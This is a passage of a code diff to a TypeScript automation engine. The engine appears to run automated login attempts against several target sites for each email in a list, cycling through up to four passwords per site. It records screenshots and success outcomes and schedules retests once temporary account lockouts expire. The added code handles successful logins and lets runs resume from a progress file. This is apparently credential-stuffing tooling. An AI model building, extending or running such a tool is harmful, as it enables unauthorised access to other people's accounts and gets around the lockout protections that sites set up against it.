       await this.captureScreenshot(page, `${site.name}:attempt-${attemptNum}-${response}`);
 
       // ── Handle response ──
+      if (response === "success") {
+        this.log("INFO", `  ${site.name}: ✅ login success on attempt ${attemptNum}`);
+        return { outcome: "success", attempts: attemptNum };
+      }
+
       if (response === "disabled") {
         throw new PermDisabledError();
       }
@@ -678,6 +992,7 @@ export class AutomationEngine extends EventEmitter {
       }
 
       // response === "incorrect", "timeout", or "other"
+      lastResponse = response;
       if (attemptNum < 4) {
         this.log("WARN", `  ${site.name}: ${response} on attempt ${attemptNum} \u2014 trying next password`);
       } else {
@@ -818,6 +1133,65 @@ export class AutomationEngine extends EventEmitter {
     } catch {
       this.log("WARN", `Failed to write incremental result for ${row.email}`);
     }
+  }
+
+  /** Resume support: returns true if this row was completed in a prior run
+   *  AND no expired tempdisabled cooldown demands a retest. */
+  private isRowAlreadyDone(idx: number): boolean {
+    const row = this.rows[idx];
+    if (row.status !== "done") return false;
+    if (row.tempDisabledUntil && new Date(row.tempDisabledUntil).getTime() < Date.now()) {
+      return false;  // cooldown elapsed — retest with next batch
+    }
+    return true;
+  }
+
+  /** Resume support: hydrate this.rows from progress.json, matching by email.
+   *  Returns the count of rows restored to a "done" state. */
+  private loadProgress(targets: SiteConfig[]): number {
+    if (!fs.existsSync(PROGRESS_FILE)) return 0;
+    try {
+      const data = JSON.parse(fs.readFileSync(PROGRESS_FILE, "utf-8"));
+      if (!Array.isArray(data.rows)) return 0;
+      const priorByEmail = new Map<string, RowStatus>();
+      for (const r of data.rows) {
+        if (r && typeof r.email === "string") priorByEmail.set(r.email.toLowerCase(), r);
+      }
+      let restored = 0;
+      for (const row of this.rows) {
+        const prior = priorByEmail.get(row.email.toLowerCase());
+        if (!prior) continue;
+        row.status = prior.status;
+        row.currentBatch = prior.currentBatch ?? 0;
+        row.sessionId = prior.sessionId;
+        row.recordingUrl = prior.recordingUrl;
+        row.tempDisabledUntil = prior.tempDisabledUntil;
+        row.scheduledRetestAt = prior.scheduledRetestAt;
+        if (prior.sites && typeof prior.sites === "object") {
+          for (const t of targets) {
+            const ps = (prior.sites as any)[t.name];
+            if (ps) {
+              row.sites[t.name].outcome = ps.outcome;
+              row.sites[t.name].attempts = ps.attempts ?? 0;
+              row.sites[t.name].error = ps.error;
+            }
+          }
+        }
+        if (this.isRowAlreadyDone(row.rowIndex)) restored++;
+      }
+      return restored;
+    } catch (e: any) {
+      this.log("WARN", `Failed to load ${PROGRESS_FILE}: ${(e.message || String(e)).substring(0, 100)}`);
+      return 0;
+    }
+  }
+
+  /** Resume support: persist current row state to progress.json (called after every row). */
+  private saveProgress(): void {
+    try {
+      const data = { updatedAt: new Date().toISOString(), rows: this.rows };
+      fs.writeFileSync(PROGRESS_FILE, JSON.stringify(data, null, 2), "utf-8");
+    } catch { /* disk-full / permission — non-fatal */ }
   }
 
   private emitRowUpdate(idx: number): void {
